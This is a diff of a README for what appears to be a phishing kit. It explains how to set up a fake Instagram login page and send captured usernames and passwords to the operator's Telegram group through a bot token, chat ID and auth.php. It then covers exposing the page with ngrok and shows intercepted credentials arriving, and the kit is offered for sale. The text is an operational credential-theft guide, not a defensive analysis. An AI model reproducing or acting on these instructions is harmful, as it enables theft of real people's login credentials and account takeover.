@@ -179,43 +179,41 @@ To order, email me.
 
 My information is in the [contacts](#how-to-hack-anyone-while-drinking-tea-at-home).
 
-## Capturing data from `<form>`
+## Capturing data from `<form>` by a Telegram bot
 
-### We will consider only one of the methods
+### Creating a Telegram bot
 
-* Sending data from a `<form>` by a Telegram bot :
-  * First, we need to find a bot with a nickname in "Telegram" : @BotFather
-  * Open the bot window, press /start
-  * Next we are interested in the /newbot command
-  * @BotFather will ask for a name for our bot. The name is what will be displayed in the chat list.
-  * @BotFather asks us to set the username for the bot. This is the username, that you can use to find the bot in searches. (username must end with the prefix "bot")
-  * After we submit our username, @BotFather tells us that the bot was successfully created and gives us a token to access the bot via the HTTP API. We'll need it later.
+* Find a bot with a nickname in Telegram "@BotFather".
+* Open the bot window, press `/start`.
+* Next we are interested in the `/newbot` command.
+* @BotFather will ask for a name for our bot. The name is what will be displayed in the chat list.
+* @BotFather asks us to set the username for the bot, username must end with the prefix "bot".
 
-#### Now we need to create a group in Telegram to which we will receive intercepted data.
+After we submit our username, @BotFather tells us that the bot was successfully created and gives us a token to access the bot via the HTTP API. 
 
-(WE NEED TO CREATE GROUP NOT CHANNEL)
+We will need it later.
 
-* Creating and configuring a group :
-  * Click "New Group" and name the channel as you like.
-  * Add the bot to our group, which we created earlier, the bot is added by its username, for example: "@yourbot" without the quotes.
-  * Now go to our bot and press /start, do not touch it again!
-  * Now we need to know our chat_id in the group we created, to do that you need to add another bot to the group with a name: @ShowJsonBot
-  * After we have added this bot, it should send us a message to the group, we are interested in the line: **`"chat": { "id": -111111111}`**
-  * Copy the id with the “-“ sign we will need it later, you can now remove @ShowJsonBot from our group
+### Creating a Telegram group 
 
-### Setting up our **[auth.php](auth.php)** :
+(WE NEED TO CREATE GROUP NOT ~~CHANNEL~~)
 
-If you have not changed the attribute `name=""` from our **[index.php](index.php)** `<form>`, leave the variables `$name` and `$password` unchanged.
-<br>
+* Click "New Group" and name the channel as you like.
+* Add the bot we created to your group, the bot is added by its username, for example: `@yourbot`.
+* Now go to our bot and press `/start`, do not touch it again!
+* Now we need to know our chat_id in the group we created, to do that you need to add another bot to the group with a name `@ShowJsonBot`.
+* After we have added this bot, it should send us a message to the group, we are interested in the line: `"chat": { "id": -111111111}`.
+* Copy the id with the “-“ sign we will need it later, you can now remove `@ShowJsonBot` from our group
+
+### Setting up our **[auth.php](auth.php)**
+
+If you have not changed the attribute `name=""` from our **[index.php](index.php)** `<form>`, <br> leave the variables `$name` and `$password` unchanged.
 
 * $token
-  * In the `$token` variable, we need to insert the token that we got when we created the bot from @BotFather.
+  * In the `$token` variable, we need to insert the token that we got when we created the bot from `@BotFather`.
 * $chat_id
-  * In the variable `$chat_id`, insert the id of the chat that we received in our group from the bot @ShowJsonBot.
+  * In the variable `$chat_id`, insert the id of the chat that we received in our group from the bot `@ShowJsonBot`.
 
-<br>
-
-That's all, there are comments in the **[auth.php](auth.php)** file itself to help you understand the rest of the code we can work with.
+There are comments in the **[auth.php](auth.php)** file itself to help you understand the rest of the code we can work with.
 
 ## Start our server
 
@@ -244,7 +242,7 @@ That's all, there are comments in the **[auth.php](auth.php)** file itself to he
 
 * We are interested in the last item "Forwarding", it is underlined with a red line.
 * There will be a link which leads to your local server.
-* To make the link redirects us to your fake site, you need to add "/your_folder_name" at the end of the link.
+* To make the link redirects us to your fake site, you need to add `/your_folder_name` at the end of the link.
 * If you have done everything correctly, the link from ngrok will take you to your local server.
 * Remember to add `/your_folder_name` at the end of the link.
 * Enter a username and password, you can enter any set of letters and numbers, it does not matter, then press "Log In".
@@ -261,13 +259,11 @@ That's all, there are comments in the **[auth.php](auth.php)** file itself to he
 
  `}`
 
-#### Here's what I got :
+### Here's what I got :
 
 ![fake instagram page](img/ig-access.gif)
 
-The message in the bottom right corner of the screen is the intercepted data from the form,
-
-impressive, isn't it?
+The message in the bottom right corner of the screen is the intercepted data from the `<form>`, impressive, isn't it?
 
 ## Let's go
 
